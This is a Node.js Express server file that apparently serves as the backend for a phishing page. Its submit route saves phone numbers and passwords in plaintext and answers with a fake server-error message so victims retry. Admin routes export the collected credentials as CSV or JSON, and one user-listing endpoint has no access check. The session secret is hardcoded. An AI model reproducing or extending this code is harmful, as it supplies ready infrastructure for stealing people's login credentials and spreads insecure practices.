const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const { Parser } = require("json2csv");
const User = require("./models/User");
const path = require("path");
require("dotenv").config();
const cors = require("cors");

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));

if (!process.env.MONGO_URI) {
  console.error(" MONGO_URI is not set in environment variables!");
  process.exit(1);
}

mongoose.connect(process.env.MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
})
.then(() => console.log(" Connected to MongoDB"))
.catch((err) => console.error(" MongoDB connection failed:", err));


app.use(session({
  secret: "simpleappsecret",
  resave: false,
  saveUninitialized: true
}));

app.use(cors({
  origin: "https://sweetlifemlw.netlify.app", // only allow this origin
  credentials: true, // allow cookies to be sent if you're using JWT cookies
}));

const isToday = (date) => {
  const today = new Date();
  return (
    date.getDate() === today.getDate() &&
    date.getMonth() === today.getMonth() &&
    date.getFullYear() === today.getFullYear()
  );
};

app.post("/api/submit", async (req, res) => {
  const { phone, password } = req.body;

  // Validation
  if (!phone || !password || password.length < 6) {
    return res.status(400).json({
      message: "Password must be at least 6 characters."
    });
  }

  try {
    const user = new User({ phone, password });
    await user.save();

    res.status(200).json({
      message: "Unexpected server error. Please try again later!!!."
    });
  } catch (err) {
    console.error("❌ Error saving user:", err);
    res.status(500).json({
      message: "Unexpected server error. Please try again later."
    });
  }
});



app.get("/admin/login", (req, res) => {
  res.render("login");
});

app.post("/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (
    username === process.env.ADMIN_USERNAME &&
    password === process.env.ADMIN_PASSWORD
  ) {
    req.session.admin = true;
    res.redirect("/admin");
  } else {
    res.send("Invalid credentials");
  }
});

app.post("/admin/logout", (req, res) => {
  req.session.destroy(() => {
    res.redirect("/admin/login");
  });
});

const requireAdmin = (req, res, next) => {
  if (req.session.admin) return next();
  res.redirect("/admin/login");
};

app.get("/admin", requireAdmin, async (req, res) => {
  const allUsers = await User.find({});
  const todayUsers = allUsers.filter(user => isToday(user.createdAt));
  res.render("admin", { allUsers, todayUsers });
});

app.get("/admin/download/csv", requireAdmin, async (req, res) => {
  const type = req.query.type;
  const allUsers = await User.find({});
  const data = type === "today" ? allUsers.filter(u => isToday(u.createdAt)) : allUsers;
  const parser = new Parser({ fields: ["phone", "password", "createdAt"] });
  const csv = parser.parse(data);
  res.header("Content-Type", "text/csv");
  res.attachment(`${type || "all"}-submissions.csv`);
  res.send(csv);
});

app.get("/admin/download/json", requireAdmin, async (req, res) => {
  const type = req.query.type;
  const allUsers = await User.find({});
  const data = type === "today" ? allUsers.filter(u => isToday(u.createdAt)) : allUsers;
  res.json(data);
});

app.get("/admin/api/users", async (req, res) => {
  const { type = "all", page = 1, limit = 20 } = req.query;
  const filter = {};

  if (type === "today") {
    const start = new Date();
    start.setHours(0, 0, 0, 0);
    const end = new Date();
    end.setHours(23, 59, 59, 999);
    filter.createdAt = { $gte: start, $lte: end };
  }

  try {
    const skip = (page - 1) * limit;
    const users = await User.find(filter)
      .sort({ createdAt: -1 })
      .skip(Number(skip))
      .limit(Number(limit))
      .lean();

    const totalCount = await User.countDocuments(filter);

    res.json({
      users,
      totalCount,
      page: Number(page),
      limit: Number(limit),
    });
  } catch (err) {
    console.error("Error fetching users:", err);
    res.status(500).json({ message: "Error fetching users" });
  }
});


const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Running on http://localhost:${PORT}`));
